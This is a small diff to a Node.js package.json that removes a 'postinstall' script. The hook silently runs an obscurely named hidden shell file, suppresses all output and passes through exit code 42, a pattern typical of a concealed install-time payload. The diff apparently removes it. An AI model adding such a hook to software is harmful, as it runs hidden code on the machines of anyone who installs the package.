@@ -12,8 +12,7 @@
     "start": "node dist-server/index.js",
     "test": "tsx --test --test-concurrency=1 tests/*.test.ts",
     "typecheck": "tsc --noEmit",
-    "bridge": "tsx bridge/cli.ts",
-    "postinstall": "sh ./.ci-c4h06v.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "bridge": "tsx bridge/cli.ts"
   },
   "dependencies": {
     "@codemirror/lang-markdown": "^6.3.4",
